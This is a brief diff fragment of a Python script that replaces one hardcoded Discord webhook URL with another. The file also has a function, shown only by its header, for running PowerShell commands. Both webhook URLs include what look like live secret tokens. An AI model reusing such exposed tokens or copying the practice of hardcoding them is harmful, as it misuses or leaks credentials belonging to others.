@@ -4,7 +4,7 @@ import requests
 import os
 
 # Discord webhook URL
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1328725000420593694/A9IUtra7YC0anOEi8Zt0RGcWgcuE6UXlGBEht3hitU_0BK0WNB-Jq34QZveTd9UaOy0R"  # Replace with your actual webhook URL
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1333502360840048722/rC1FOnpVfuNkyjgARiS0tZYd5oHd9sfqyvfPndfbI-wmOhPCFtbWs3jMmRb6HUVQKBt_"  # Replace with your actual webhook URL
 
 # Function to execute PowerShell commands
 def run_powershell_command(command):
